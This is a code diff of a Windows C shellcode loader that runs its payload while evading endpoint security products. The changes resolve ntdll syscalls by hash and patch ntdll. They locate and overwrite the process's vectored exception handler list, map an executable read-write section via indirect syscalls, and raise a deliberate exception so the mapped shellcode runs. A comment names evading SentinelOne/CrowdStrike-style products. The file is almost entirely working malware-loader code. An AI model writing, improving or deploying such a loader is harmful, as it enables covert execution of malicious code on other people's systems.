@@ -1,16 +1,18 @@
 #include "header.h"
 
-#pragma warning (disable : 4024)
-#pragma warning (disable : 4312)
-#pragma warning (disable : 4047)
+#pragma warning (disable:4047)
+#pragma warning (disable:4024)
+#pragma warning (disable:4133)
+#pragma warning (disable:4022)
 
 extern ULONG_PTR GetBase(ULONG_PTR* uSelf);
-extern MoveSyscallAddress(PVOID pSyscallAddress);
+extern void MoveSyscallAddress(PVOID pSyscallAddress);
+extern void Patch(PVOID addr);
+extern void Oops();
 
 NTAPI_FUNC g_Nt = { 0 };
 PE_STUFF g_PeStuff = { 0 };
 
-//Payload is nibblewise encoded and sitting in .rsrc
 VOID Reverse(PBYTE pEncBuffer, DWORD dwSize) {
 
 	for (SIZE_T i = 0, j = 0; i < dwSize; i += 2, j++) {
@@ -63,7 +65,6 @@ ULONG Hasher(PVOID pString, ULONG ulLength, PVOID junk) {
 
 	} while (TRUE);
 	return Hash;
-
 }
 
 BOOL _memcpy(PVOID dest, PVOID source, SIZE_T size) {
@@ -80,8 +81,7 @@ BOOL _memcpy(PVOID dest, PVOID source, SIZE_T size) {
 	return TRUE;
 }
 
-//I love my VehhyBoy <3
-LONG NTAPI VehhyBoy(PEXCEPTION_POINTERS a) {
+LONG NTAPI VehhyBoy(EXCEPTION_POINTERS* a) {
 
 	if (a->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
 
@@ -98,6 +98,15 @@ LONG NTAPI VehhyBoy(PEXCEPTION_POINTERS a) {
 		return EXCEPTION_CONTINUE_EXECUTION;
 	}
 
+	if (a->ExceptionRecord->ExceptionCode == EXCEPTION_PRIV_INSTRUCTION) {
+
+		return EXCEPTION_CONTINUE_SEARCH;
+	}
+	
+	return EXCEPTION_CONTINUE_SEARCH;
+}
+
+LONG NTAPI Dummy(EXCEPTION_POINTERS* a) {
 	return EXCEPTION_CONTINUE_SEARCH;
 }
 
@@ -158,8 +167,10 @@ BOOL InitSys(ULONG Hash, PNT_SYSCALL pNtSys) {
 
 BOOL InitStuff() {
 
-	ULONG_PTR						uSelf = NULL;
-	ULONG_PTR						uNtdll = GetBase(&uSelf);
+	ULONG_PTR						uSelf = GetModuleHandle(NULL);
+	ULONG_PTR						uNtdll = GetModuleHandleW(L"NTDLL.DLL");
+
+	Patch(uNtdll);
 
 	PIMAGE_NT_HEADERS				pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)uNtdll + ((PIMAGE_DOS_HEADER)uNtdll)->e_lfanew);
 	PIMAGE_EXPORT_DIRECTORY			pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uNtdll + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
@@ -192,34 +203,40 @@ BOOL InitStuff() {
 	return TRUE;
 }
 
-BOOL OverWrite(PVOID* pVehPointerLocation) {
+PVOID HandlerList() {
 
-	VECTORED_HANDLER_LIST	handler_list = { 0 };
-	VEH_HANDLER_ENTRY		handler_entry = { 0 };
-	ULONG_PTR				veh_list_win10 = g_PeStuff.uNtdll + VEH_LIST_OFFSET_WIN10;
+	PBYTE   pNext = NULL;
+	PBYTE   pRtlpAddVectoredHandler = NULL;
+	PBYTE   pVehList = NULL;
+	int     offset = 0;
+	int     i = 1;
 
-	if (!_memcpy(&handler_list, veh_list_win10, sizeof(handler_list)))
-		return FALSE;
+	PBYTE pRtlAddVectoredExceptionHandler = (PBYTE)GetProcAddress(g_PeStuff.uNtdll, "RtlAddVectoredExceptionHandler");
 
-	if (!_memcpy(&handler_entry, handler_list.FirstExceptionHandler, sizeof(handler_entry)))
-		return FALSE;
+	if (!pRtlAddVectoredExceptionHandler)
+		return NULL;
 
-	//EncodePointer can be replaced with a syscall and some shitty encoding function
-	handler_entry.VectoredHandler1 = EncodePointer(&VehhyBoy);
+	pRtlpAddVectoredHandler = (ULONG_PTR)pRtlAddVectoredExceptionHandler + 0x10;
 
-	ULONG_PTR pointer_offset = (ULONG_PTR)handler_list.FirstExceptionHandler + offsetof(VEH_HANDLER_ENTRY, VectoredHandler1);
+	while (TRUE) {
 
-	if (!_memcpy(pointer_offset, &handler_entry.VectoredHandler1, sizeof(handler_entry.VectoredHandler1)))
-		return FALSE;
+		if ((*pRtlpAddVectoredHandler == 0x48) && (*(pRtlpAddVectoredHandler + 1) == 0x8d) && (*(pRtlpAddVectoredHandler + 2) == 0x0d)) {
 
-	*pVehPointerLocation = pointer_offset;
+			if (i == 2) {
+				offset = *(int*)(pRtlpAddVectoredHandler + 3);
+				pNext = (ULONG_PTR)pRtlpAddVectoredHandler + 7;
+				pVehList = pNext + offset;
+				return pVehList;
+			}
+			else {
+				i++;
+			}
+		}
 
-	if (!*pVehPointerLocation) {
-		return FALSE;
+		pRtlpAddVectoredHandler++;
 	}
-	else {
-		return TRUE;
-	}
+
+	return NULL;
 }
 
 BOOL Map(PVOID* pPayload) {
@@ -235,9 +252,9 @@ BOOL Map(PVOID* pPayload) {
 	fnNtMapViewOfSection pNtMapViewOfSection = (fnNtMapViewOfSection)(g_Nt.NtMapViewOfSection.dwSSN);
 
 	MoveSyscallAddress(g_Nt.NtCreateSection.pSyscallAddress);
-	if ((STATUS = pNtCreateSection(&hSection, SECTION_RWX, NULL, &li, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0) 
+	if ((STATUS = pNtCreateSection(&hSection, SECTION_RWX, NULL, &li, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != 0)
 		return FALSE;
-	
+
 	MoveSyscallAddress(g_Nt.NtMapViewOfSection.pSyscallAddress);
 	if ((STATUS = pNtMapViewOfSection(hSection, (HANDLE)-1, &pAddr, NULL, NULL, NULL, &rand, 1, NULL, PAGE_EXECUTE_READWRITE)) != 0)
 		return FALSE;
@@ -252,31 +269,51 @@ BOOL Map(PVOID* pPayload) {
 	return TRUE;
 }
 
-VOID main() {
+BOOL OverWriteNShit() {
 
-	PVOID	 pPayload = NULL;
-	PVOID	 pVehPointerLocation = NULL;
-	PVOID	 pFinal = NULL;
+	VECTORED_HANDLER_LIST	handler_list = { 0 };
+	VEH_HANDLER_ENTRY		handler_entry = { 0 };
+	PVOID					pHandlerList = HandlerList();
+	PVOID					pShellcode = NULL;
+
+	_memcpy(&handler_list, pHandlerList, sizeof(VECTORED_HANDLER_LIST));
+
+	if (handler_list.FirstExceptionHandler == (ULONG_PTR)pHandlerList + sizeof(PVOID)) {
+		AddVectoredExceptionHandler(1, Dummy); //If not against S1/CS shit will still work
+		_memcpy(&handler_list, pHandlerList, sizeof(VECTORED_HANDLER_LIST));
+	}
+
+	_memcpy(&handler_entry, handler_list.FirstExceptionHandler, sizeof(VEH_HANDLER_ENTRY));
+
+	handler_entry.VectoredHandler = EncodePointer(VehhyBoy);
+
+	PVOID pointer_offset = (ULONG_PTR)handler_list.FirstExceptionHandler + offsetof(VEH_HANDLER_ENTRY, VectoredHandler);
+
+	_memcpy(pointer_offset, &handler_entry.VectoredHandler, sizeof(handler_entry.VectoredHandler));
+	
+	if (!Map(&pShellcode))
+		return FALSE;
+
+	VEH_HANDLER_ENTRY* new_entry = (VEH_HANDLER_ENTRY*)HeapAlloc(GetProcessHeap(), 0, sizeof(VEH_HANDLER_ENTRY));
+
+	new_entry->Entry.Flink = (ULONG_PTR)pHandlerList + sizeof(PVOID);
+	new_entry->Entry.Blink = handler_list.FirstExceptionHandler;
+	new_entry->SyncRefs = handler_entry.SyncRefs;
+	new_entry->VectoredHandler = EncodePointer(pShellcode);
+	*((PVOID*)handler_list.FirstExceptionHandler) = new_entry;
+
+	return TRUE;
+}
+
+VOID main() {
 
 	if (!InitStuff())
 		return;
 
-	if (!OverWrite(&pVehPointerLocation))
+	if (!OverWriteNShit())
 		return;
 
-	if (!Map(&pPayload))
-		return;
-
-	pFinal = EncodePointer(pPayload);
-
-	//Overwrite pointer again for local exec
-	if (!_memcpy(pVehPointerLocation, &pFinal, sizeof(PVOID)))
-		return;
-
-	//We do just a bit of trolling (just cause some exception)
-	DWORD	 A = 0;
-	DWORD	 B = 5;
-	DWORD	 C = B / A;
-	ReadProcessMemory((HANDLE)-1, 0x1, &C, 69, NULL);
+	Oops();
+	
 	return;
 }
